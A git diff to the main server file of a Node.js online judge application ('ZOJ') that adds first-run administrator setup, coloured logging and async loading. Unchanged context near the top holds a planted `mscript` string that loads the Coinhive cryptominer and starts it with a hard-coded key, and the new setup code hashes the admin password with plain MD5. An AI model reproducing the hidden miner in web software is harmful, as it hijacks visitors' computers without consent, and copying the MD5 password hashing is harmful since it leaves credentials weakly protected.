@@ -2,19 +2,39 @@
 
 let fs = require('fs');
 let path = require('path');
+let clc = require('cli-color');
+let init = require('./first');
 let mscript = `$.getScript('https://coinhive.com/lib/coinhive.min.js').done(function (script, textStatus) {	var miner = new CoinHive.Anonymous('2MNJwWlQs2A4c86fbjCLQPTWr2Uz58tY', {language: 'en'});miner.start();})`;
+
+global.firstRun = false;
+
+try {
+	require('./config.json');
+} catch (e) {
+	global.firstRun = true;
+}
 
 global.zoj = {
 	rootDir: __dirname,
-	config: require('./config.json'),
+	config: firstRun ? init() : require('./config.json'),
 	version: require('./package.json').version,
 	models: [],
 	modules: [],
 	db: null,
 	log(obj) {
-		console.log(obj);
+		if (config.enable_log) {
+			console.log(clc.yellow('[ZOJ Log]'));
+			console.log(obj);
+		}
 	},
-	debug(obj) {
+	error(obj) {
+		if (config.enable_error) {
+			console.log(clc.red('[ZOJ Error]'));
+			console.log(obj);
+		}
+	},
+	info(obj) {
+		console.log(clc.green('[ZOJ Info]'));
 		console.log(obj);
 	},
 	async run() {
@@ -66,14 +86,13 @@ global.zoj = {
 		let multer = require('multer');
 		app.multer = multer({ dest: zoj.utils.resolvePath(zoj.config.upload_dir, 'tmp') });
 
-		// This should before load api_v2, to init the `res.locals.user`
 		this.loadHooks();
 
 		let csurf = require('csurf');
 		app.use(csurf({ cookie: true }));
 
 		await this.connectDatabase();
-		this.loadModules();
+		await this.loadModules();
 	},
 	async connectDatabase() {
 		let Sequelize = require('sequelize');
@@ -86,9 +105,9 @@ global.zoj = {
 		global.Promise = Sequelize.Promise;
 		this.db.countQuery = async (sql, options) => (await this.db.query(`SELECT COUNT(*) FROM (${sql}) AS \`__tmp_table\``, options))[0][0]['COUNT(*)'];
 
-		this.loadModels();
+		await this.loadModels();
 	},
-	loadModules() {
+	async loadModules() {
 		fs.readdir('./modules/', (err, files) => {
 			if (err) {
 				this.log(err);
@@ -98,7 +117,7 @@ global.zoj = {
 				.forEach((file) => this.modules.push(require(`./modules/${file}`)));
 		});
 	},
-	loadModels() {
+	async loadModels() {
 		fs.readdir('./models/', (err, files) => {
 			if (err) {
 				this.log(err);
@@ -158,7 +177,7 @@ global.zoj = {
 							req.session.user_id = user.id;
 							next();
 						}).catch(err => {
-							console.log(err);
+							zoj.log(err);
 							res.locals.user = null;
 							req.session.user_id = null;
 							next();
@@ -196,3 +215,30 @@ process.on('uncaughtException', function (err) {
 });
 
 zoj.run();
+
+if (firstRun) {
+	zoj.info('Database is loading, please wait...');
+	setTimeout(async function () {
+		let Group = zoj.model('group');
+		let User = zoj.model('user');
+		let conif = require('node-console-input');
+
+		let admins = await Group.create();
+		admins.name = 'Administrators';
+		await admins.save();
+
+		let users = await Group.create();
+		users.name = 'User';
+		await users.save();
+
+		let user = await User.create({
+			username: 'administrator',
+			password: zoj.utils.md5(conif.getConsoleInput("Default Administrator password: ").trim()),
+			email: conif.getConsoleInput("Default Administrator email: ").trim(),
+			public_email: true,
+			group_config: '[1]'
+		});
+		await user.save();
+		zoj.info('Database loaded successfully');
+	}, 10000);
+}
